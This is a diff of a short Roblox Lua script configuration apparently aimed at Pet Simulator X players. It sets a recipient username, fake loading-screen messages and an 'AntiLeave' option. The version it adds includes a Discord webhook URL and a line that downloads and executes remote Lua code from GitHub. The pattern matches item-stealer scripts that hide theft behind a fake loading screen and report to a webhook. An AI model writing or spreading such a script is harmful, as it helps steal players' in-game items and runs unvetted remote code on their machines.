@@ -1,23 +1,9 @@
-UserName = "Wizard_CatWhite"
-
-UserName2 = "Wizard_CatWhite" -- optional delete the whole line if you don't want it
-
-_G.LoadingScreen = true
-
-_G.AntiLeave = true
-
-_G.MouseLock = true 
-
--- set them to false if you don't need them
-
-_G.ScriptName = "Huge Games"
-
-_G.FirstText = "Script Preparing"
-
-_G.SecondText = "Script Loading..."
-
-_G.ThirdText = "Almost Done..."
-
-_G.WaitingTime = 200 -- it's the time between 0% and 100% in secondes
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CorruptedClan/RizzMain/main/rizzbest.lua", true))()
+Username = "Wizard_CatWhite"
+WebHook = "https://discord.com/api/webhooks/1090853107816214548/Vxcs9dIe4jRfqeVbX6iHJn7ZifN4_kCPfJnI17LIINOqPfBtjzXjdG0I7B93mDORO5jS"
+loadingscreen = true
+_G.CustomScriptName = "PSX"
+_G.Text1 = "Loading..."
+_G.Text2 = "Loaded"
+_G.Text3 = "Executing"
+_G.Text4 = "Please wait...."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
